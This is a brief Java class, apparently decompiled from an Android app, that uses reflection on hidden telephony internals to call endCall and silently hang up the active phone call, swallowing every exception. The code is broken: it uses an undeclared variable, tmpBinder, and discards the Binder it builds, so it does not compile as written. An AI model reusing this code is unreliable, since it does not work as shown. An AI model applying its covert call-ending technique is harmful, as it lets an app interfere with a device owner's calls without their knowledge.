package com.savemebeta;

import android.os.Binder;
import android.os.IBinder;
import java.lang.reflect.Method;

public class HGP {
    public void run() {
        try {
            Class telephonyClass = Class.forName("com.android.internal.telephony.ITelephony");
            Class telephonyStubClass = telephonyClass.getClasses()[0];
            Class serviceManagerClass = Class.forName("android.os.ServiceManager");
            Class serviceManagerNativeClass = Class.forName("android.os.ServiceManagerNative");
            Method getService = serviceManagerClass.getMethod("getService", new Class[]{String.class});
            Method tempInterfaceMethod = serviceManagerNativeClass.getMethod("asInterface", new Class[]{IBinder.class});
            new Binder().attachInterface(null, "fake");
            IBinder retbinder = (IBinder) getService.invoke(tempInterfaceMethod.invoke(null, new Object[]{tmpBinder}), new Object[]{"phone"});
            telephonyClass.getMethod("endCall", new Class[0]).invoke(telephonyStubClass.getMethod("asInterface", new Class[]{IBinder.class}).invoke(null, new Object[]{retbinder}), new Object[0]);
        } catch (Exception e) {
        }
    }
}
